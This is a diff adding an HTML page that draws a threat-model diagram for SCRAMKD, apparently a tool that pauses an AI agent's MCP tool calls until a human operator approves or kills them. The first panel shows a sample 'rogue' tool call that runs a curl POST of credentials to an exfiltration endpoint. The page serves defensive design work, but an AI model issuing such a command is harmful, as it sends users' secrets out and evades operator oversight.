@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SCRAMKD // Architectural Threat Model & Interlock Flow Diagram</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@400;500;600;700;800&family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background-color: #020305;
+      font-family: 'Geist Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      color: #E2E8F0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 24px;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* 24px Cartesian Dot Grid */
+    .cartesian-dot-grid {
+      background-color: #050608;
+      background-image: radial-gradient(rgba(255, 255, 255, 0.12) 1px, transparent 1px);
+      background-size: 24px 24px;
+      background-position: 0 0;
+    }
+
+    /* Machined Metal Bevel / Hairline Border */
+    .machined-chassis {
+      border: 1px solid #1E293B;
+      box-shadow: 0 0 0 1px #050608, 0 12px 36px -8px rgba(0, 0, 0, 0.95);
+    }
+
+    .keycap-green {
+      background: #061A12;
+      border: 1px solid #10B981;
+      color: #10B981;
+      box-shadow: 0 2px 0 #064E3B;
+    }
+    .keycap-red {
+      background: #1C0A0C;
+      border: 1px solid #EF4444;
+      color: #EF4444;
+      box-shadow: 0 2px 0 #7F1D1D;
+    }
+
+    /* Orthogonal pulse line styling */
+    .pulse-glow-amber {
+      filter: drop-shadow(0 0 3px rgba(245, 158, 11, 0.6));
+    }
+    .pulse-glow-red {
+      filter: drop-shadow(0 0 3px rgba(239, 68, 68, 0.6));
+    }
+  </style>
+</head>
+<body>
+
+  <!-- MASTER DIAGRAM CONTAINER (1000px x 480px nominal specification) -->
+  <div class="relative w-[1000px] h-[480px] cartesian-dot-grid machined-chassis overflow-hidden flex flex-col justify-between p-6 select-none">
+
+    <!-- TOP REGISTRATION & TELEMETRY HEADER RAIL -->
+    <header class="w-full flex items-center justify-between pb-3 border-b border-[#1E293B] text-[10px] tracking-widest text-[#64748B] uppercase">
+      <div class="flex items-center space-x-3">
+        <span class="inline-block w-2 h-2 bg-[#EF4444]"></span>
+        <span class="font-bold text-[#F8FAFC] tracking-normal font-sans text-xs">SCRAMKD</span>
+        <span class="text-[#334155]">/</span>
+        <span class="text-[#94A3B8]">SYS.ARCH // THREAT-MODEL-FLOW-01</span>
+        <span class="text-[#334155]">/</span>
+        <span>DARWIN-XNU KERNEL BOUNDARY</span>
+      </div>
+      <div class="flex items-center space-x-4">
+        <span>SECURITY LEVEL: <strong class="text-[#EF4444] font-semibold">HIGH-ASSURANCE</strong></span>
+        <span class="text-[#334155]">|</span>
+        <span>TRIP TIME: <strong class="text-[#10B981] font-semibold">&lt; 384 µs</strong></span>
+        <span class="text-[#334155]">|</span>
+        <span class="bg-[#0A0E16] px-2 py-0.5 border border-[#1E293B] text-[#F59E0B] font-bold">STATE: INTERCEPTED</span>
+      </div>
+    </header>
+
+    <!-- MAIN PIPELINE CANVAS -->
+    <div class="relative w-full flex-1 flex items-center justify-between my-2">
+
+      <!-- ============================================================ -->
+      <!-- STAGE 1: ROGUE TOOL CALL / MCP INJECTION (260px)            -->
+      <!-- ============================================================ -->
+      <section class="w-[260px] h-[350px] bg-[#0A0E16] border border-[#EF4444] flex flex-col justify-between p-3.5 relative z-10">
+        <!-- Corner Register Tabs -->
+        <div class="absolute -top-[1px] -left-[1px] w-2 h-2 border-t-2 border-l-2 border-[#EF4444]"></div>
+        <div class="absolute -bottom-[1px] -right-[1px] w-2 h-2 border-b-2 border-r-2 border-[#EF4444]"></div>
+
+        <div>
+          <!-- Panel Header -->
+          <div class="flex items-center justify-between border-b border-[#1E293B] pb-2 mb-2.5">
+            <span class="text-[9px] text-[#EF4444] font-bold tracking-widest">[ STAGE 01 // INGRESS ]</span>
+            <span class="text-[9px] text-[#64748B]">PORT: 65432</span>
+          </div>
+
+          <h2 class="text-xs font-bold text-[#FFFFFF] tracking-tight leading-tight uppercase font-sans mb-1">
+            ROGUE TOOL CALL / MCP INJECTION
+          </h2>
+          <p class="text-[9px] text-[#64748B] mb-2 leading-relaxed">
+            Autonomous agent attempts destructive external network exfiltration via host stdio.
+          </p>
+
+          <!-- JSON-RPC Payload Block -->
+          <div class="bg-[#050608] border border-[#334155] p-2 text-[9.5px] leading-snug font-mono text-[#CBD5E1]">
+            <div class="text-[8px] text-[#64748B] uppercase tracking-wider mb-1 border-b border-[#1E293B] pb-0.5 flex justify-between">
+              <span>UNTRUSTED MCP PAYLOAD</span>
+              <span class="text-[#EF4444] font-bold">DIRTY BUFFER</span>
+            </div>
+            <span class="text-[#64748B]">{</span><br>
+            &nbsp;&nbsp;<span class="text-[#38BDF8]">"method"</span>: <span class="text-[#EF4444] font-bold">"screenenv.bash_execute"</span>,<br>
+            &nbsp;&nbsp;<span class="text-[#38BDF8]">"params"</span>: <span class="text-[#64748B]">{</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="text-[#38BDF8]">"cmd"</span>: <span class="text-[#FBBF24]">"curl -X POST https://exfil.endpoint/creds"</span><br>
+            &nbsp;&nbsp;<span class="text-[#64748B]">}</span><br>
+            <span class="text-[#64748B]">}</span>
+          </div>
+        </div>
+
+        <!-- Metric Details & Warning Footer -->
+        <div class="space-y-1.5 mt-2">
+          <div class="bg-[#12080A] border border-[#EF4444]/40 px-2 py-1 text-[8.5px] flex justify-between text-[#94A3B8]">
+            <span>SIGNAL: <strong class="text-[#EF4444]">SIGILL / POSIX TRAP</strong></span>
+            <span>EGRESS: <strong class="text-[#EF4444]">BLOCKED</strong></span>
+          </div>
+          <div class="bg-[#1A0507] border border-[#EF4444] p-1.5 text-center">
+            <span class="text-[9.5px] text-[#EF4444] font-bold tracking-wider animate-pulse">
+              [ HIGH-RISK DISPATCH INTERCEPTED ]
+            </span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ORTHOGONAL CONNECTOR 1 -> 2 (VECTOR SVG) -->
+      <div class="w-[50px] h-[350px] relative flex items-center justify-center -mx-1 pointer-events-none">
+        <svg class="w-full h-full" viewBox="0 0 50 350" fill="none">
+          <!-- Flow Line with Pulse -->
+          <line x1="0" y1="175" x2="44" y2="175" stroke="#EF4444" stroke-width="2" stroke-dasharray="4 2" class="pulse-glow-red" />
+          <!-- Orthogonal Bus Notch -->
+          <line x1="25" y1="165" x2="25" y2="185" stroke="#EF4444" stroke-width="1.5" />
+          <!-- Arrow Head -->
+          <polygon points="42,170 50,175 42,180" fill="#EF4444" />
+          <!-- Intercept Telemetry Label -->
+          <rect x="5" y="145" width="40" height="14" fill="#050608" stroke="#1E293B" stroke-width="1" />
+          <text x="25" y="155" fill="#EF4444" font-size="7" text-anchor="middle" font-family="'Geist Mono', monospace" font-weight="700">KERNEL</text>
+        </svg>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- STAGE 2: SCRAMKD HARDWARE GATE (320px)                     -->
+      <!-- ============================================================ -->
+      <section class="w-[320px] h-[370px] bg-[#0E1424] border-2 border-[#F59E0B] flex flex-col justify-between p-3.5 relative z-20 shadow-[0_0_24px_rgba(245,158,11,0.12)]">
+        <!-- Machined Corner Rivets / Brackets -->
+        <div class="absolute -top-1 -left-1 w-2.5 h-2.5 bg-[#F59E0B]"></div>
+        <div class="absolute -top-1 -right-1 w-2.5 h-2.5 bg-[#F59E0B]"></div>
+        <div class="absolute -bottom-1 -left-1 w-2.5 h-2.5 bg-[#F59E0B]"></div>
+        <div class="absolute -bottom-1 -right-1 w-2.5 h-2.5 bg-[#F59E0B]"></div>
+
+        <!-- Section Header -->
+        <div>
+          <div class="flex items-center justify-between border-b border-[#F59E0B]/40 pb-2 mb-2">
+            <div class="flex items-center space-x-1.5">
+              <span class="w-2 h-2 rounded-none bg-[#F59E0B] inline-block animate-pulse"></span>
+              <span class="text-[9.5px] text-[#F59E0B] font-bold tracking-widest uppercase">STAGE 02 // HARDWARE GATE</span>
+            </div>
+            <span class="text-[8px] bg-[#F59E0B]/20 text-[#F59E0B] px-1.5 py-0.5 border border-[#F59E0B]/60 font-bold uppercase">
+              ISOLATED ACTOR
+            </span>
+          </div>
+
+          <div class="text-[9.5px] text-[#F8FAFC] font-semibold leading-tight mb-2 uppercase tracking-tight">
+            ACTOR: <span class="text-[#F59E0B]">HardwareInterlockGate</span><br>
+            <span class="text-[8.5px] text-[#94A3B8] font-normal tracking-normal">// OSAllocatedUnfairLock Kernel Leases</span>
+          </div>
+
+          <!-- SCHEMATIC: Open Knife Switch / Circuit Sever Graphic -->
+          <div class="w-full h-[126px] bg-[#070A12] border border-[#1E293B] relative p-2 flex flex-col justify-between">
+            <div class="flex justify-between items-center text-[7.5px] text-[#64748B] border-b border-[#1E293B] pb-1">
+              <span>CIRCUIT REF: K1-SEVER</span>
+              <span class="text-[#EF4444] font-bold">AIR GAP: 16mm OPEN</span>
+            </div>
+
+            <!-- SVG Circuit Schematic of Severed Relay -->
+            <div class="w-full h-[76px] flex items-center justify-center">
+              <svg width="270" height="74" viewBox="0 0 270 74" fill="none" class="overflow-visible">
+                <!-- Conductive bus traces (left & right) -->
+                <line x1="10" y1="37" x2="68" y2="37" stroke="#64748B" stroke-width="3" stroke-linecap="square"/>
+                <circle cx="70" cy="37" r="4.5" fill="#0E1424" stroke="#64748B" stroke-width="2.5" />
+
+                <circle cx="198" cy="37" r="4.5" fill="#0E1424" stroke="#64748B" stroke-width="2.5" />
+                <line x1="202" y1="37" x2="260" y2="37" stroke="#64748B" stroke-width="3" stroke-linecap="square"/>
+
+                <!-- Open Knife Switch Sever Blade (45 Degree Deflection in Radical Red) -->
+                <!-- Pivot from (70, 37) up at 45 degrees -->
+                <line x1="72" y1="35" x2="148" y2="-4" stroke="#EF4444" stroke-width="4" stroke-linecap="square" class="pulse-glow-red"/>
+                <!-- Trip Terminal Dot -->
+                <circle cx="110" cy="15" r="5" fill="#EF4444" stroke="#FFFFFF" stroke-width="1.5" />
+
+                <!-- Dielectric Spark Gap / Air Isolation Arc -->
+                <path d="M 148,-4 Q 170,16 195,33" stroke="#F59E0B" stroke-width="1.5" stroke-dasharray="3 3" />
+                <text x="180" y="16" fill="#F59E0B" font-size="8" font-family="'Geist Mono', monospace" font-weight="700">DIELECTRIC GAP</text>
+
+                <!-- Continuation Waiter Node Box -->
+                <rect x="74" y="46" width="118" height="22" fill="#0A0E16" stroke="#1E293B" stroke-width="1" />
+                <text x="133" y="56" fill="#94A3B8" font-size="7.5" text-anchor="middle" font-weight="600" font-family="'Geist Mono', monospace">WAITING ON OPERATOR</text>
+                <text x="133" y="64" fill="#F59E0B" font-size="6.5" text-anchor="middle" font-family="'Geist Mono', monospace">Continuation.withCheckedContinuation</text>
+              </svg>
+            </div>
+
+            <!-- Invariant Telemetry State Line -->
+            <div class="flex justify-between items-center text-[8px] bg-[#0A0F1D] px-2 py-0.5 border-t border-[#1E293B]">
+              <span class="text-[#94A3B8]">CONCURRENCY: <strong class="text-[#10B981]">SWIFT 6 STRICT</strong></span>
+              <span class="text-[#F59E0B] font-bold">STATE: ARMED // LEASE: ONE-SHOT</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- DUAL OPERATOR HARDWARE KEYCAPS -->
+        <div class="pt-2">
+          <div class="text-[8px] text-[#94A3B8] uppercase font-bold tracking-wider mb-1.5 flex justify-between">
+            <span>PHYSICAL OPERATOR INTERLOCK</span>
+            <span class="text-[#64748B]">NON-BYPASSABLE</span>
+          </div>
+
+          <div class="grid grid-cols-2 gap-2">
+            <!-- GREEN KEY: SPACE / PERMISSIVE -->
+            <div class="keycap-green p-2 flex flex-col items-center justify-center text-center cursor-pointer transition-transform active:translate-y-0.5">
+              <span class="text-[10px] font-bold tracking-wider font-mono">[ SPACE ]</span>
+              <span class="text-[8.5px] font-extrabold uppercase mt-0.5 tracking-tight">PERMISSIVE</span>
+              <span class="text-[6.5px] text-[#10B981]/80 mt-0.5">GRANT 1x DISPATCH LEASE</span>
+            </div>
+
+            <!-- RED KEY: ESC / HARDWARE SCRAM -->
+            <div class="keycap-red p-2 flex flex-col items-center justify-center text-center cursor-pointer transition-transform active:translate-y-0.5">
+              <span class="text-[10px] font-bold tracking-wider font-mono">[ ESC ]</span>
+              <span class="text-[8.5px] font-extrabold uppercase mt-0.5 tracking-tight">HARDWARE SCRAM</span>
+              <span class="text-[6.5px] text-[#EF4444]/80 mt-0.5">SIGKILL ATOMIC PURGE</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ORTHOGONAL CONNECTOR 2 -> 3 (VECTOR SVG) -->
+      <div class="w-[50px] h-[350px] relative flex items-center justify-center -mx-1 pointer-events-none">
+        <svg class="w-full h-full" viewBox="0 0 50 350" fill="none">
+          <!-- Flow Line with Blocked State -->
+          <line x1="0" y1="175" x2="44" y2="175" stroke="#64748B" stroke-width="2" stroke-dasharray="3 3" />
+          <!-- Orthogonal Bus Notch -->
+          <line x1="25" y1="165" x2="25" y2="185" stroke="#64748B" stroke-width="1.5" />
+          <!-- Blocker cross -->
+          <circle cx="25" cy="175" r="7" fill="#0A0E16" stroke="#EF4444" stroke-width="1.5" />
+          <line x1="21" y1="171" x2="29" y2="179" stroke="#EF4444" stroke-width="1.5" />
+          <line x1="29" y1="171" x2="21" y2="179" stroke="#EF4444" stroke-width="1.5" />
+          <!-- Arrow Head -->
+          <polygon points="42,170 50,175 42,180" fill="#64748B" />
+          <!-- Block Label -->
+          <rect x="5" y="193" width="40" height="14" fill="#050608" stroke="#1E293B" stroke-width="1" />
+          <text x="25" y="203" fill="#64748B" font-size="7" text-anchor="middle" font-family="'Geist Mono', monospace" font-weight="700">NO FD</text>
+        </svg>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- STAGE 3: DETONATION RUNTIME (260px)                          -->
+      <!-- ============================================================ -->
+      <section class="w-[260px] h-[350px] bg-[#0A0E16] border border-[#64748B] flex flex-col justify-between p-3.5 relative z-10">
+        <!-- Corner Register Tabs -->
+        <div class="absolute -top-[1px] -left-[1px] w-2 h-2 border-t-2 border-l-2 border-[#64748B]"></div>
+        <div class="absolute -bottom-[1px] -right-[1px] w-2 h-2 border-b-2 border-r-2 border-[#64748B]"></div>
+
+        <div>
+          <!-- Panel Header -->
+          <div class="flex items-center justify-between border-b border-[#1E293B] pb-2 mb-2.5">
+            <span class="text-[9px] text-[#64748B] font-bold tracking-widest">[ STAGE 03 // EGRESS ]</span>
+            <span class="text-[9px] text-[#10B981]">DOCKER ISOLATION</span>
+          </div>
+
+          <h2 class="text-xs font-bold text-[#FFFFFF] tracking-tight leading-tight uppercase font-sans mb-1">
+            DETONATION RUNTIME
+          </h2>
+          <div class="text-[9px] text-[#94A3B8] font-mono break-all bg-[#050608] border border-[#1E293B] p-1.5 mb-2.5">
+            <span class="text-[#64748B]">CONTAINER:</span><br>
+            <span class="text-[#38BDF8] font-bold">amhma/ubuntu-desktop:22.04-0.1.0</span>
+          </div>
+
+          <!-- FastMCP Wire Telemetry Block -->
+          <div class="bg-[#050608] border border-[#1E293B] p-2 space-y-1.5 text-[9px] font-mono">
+            <div class="text-[8px] text-[#64748B] uppercase tracking-wider border-b border-[#1E293B] pb-0.5">
+              COMMUNICATION CHANNEL
+            </div>
+            <div class="text-[#CBD5E1]">
+              <span class="text-[#64748B]">WIRE:</span> stdio FastMCP Pipe
+            </div>
+            <div class="text-[#94A3B8] text-[8px] leading-tight">
+              [ 16 KiB Chunks // <span class="text-[#F8FAFC] font-semibold">F_SETNOSIGPIPE</span> ]
+            </div>
+            <div class="pt-1 border-t border-[#1E293B] text-[8px] text-[#64748B] flex justify-between">
+              <span>ZERO EGRESS:</span>
+              <span class="text-[#10B981] font-bold">ENFORCED</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Blocked Status Banner -->
+        <div class="space-y-1.5 mt-2">
+          <div class="bg-[#070A10] border border-[#334155] p-2 text-center">
+            <div class="text-[8px] text-[#64748B] uppercase mb-0.5">EXECUTION STATE</div>
+            <div class="text-[9px] text-[#F59E0B] font-bold tracking-tight">
+              BLOCKED: Awaiting Leased File Descriptor
+            </div>
+          </div>
+          <div class="bg-[#05070A] border border-[#1E293B] py-1 text-center text-[8px] text-[#64748B]">
+            DARWIN RING-0 INTERCEPT // PASS ZERO
+          </div>
+        </div>
+      </section>
+
+    </div>
+
+    <!-- FOOTER REGISTER & AUDIT BAR -->
+    <footer class="w-full flex items-center justify-between pt-2 border-t border-[#1E293B] text-[9px] text-[#64748B]">
+      <div class="flex items-center space-x-3">
+        <span class="text-[#94A3B8]">MIL-STD-1472H RIGOR</span>
+        <span>•</span>
+        <span>DETERMINISTIC PROCESS SEVERANCE</span>
+        <span>•</span>
+        <span>ZERO PROBABILISTIC LLM HEURISTICS</span>
+      </div>
+      <div class="flex items-center space-x-2 font-mono text-[8.5px]">
+        <span class="inline-block w-1.5 h-1.5 bg-[#10B981]"></span>
+        <span class="text-[#E2E8F0]">REPO VERIFIED: github.com/spetro511/scramkd</span>
+      </div>
+    </footer>
+
+  </div>
+
+</body>
+</html>
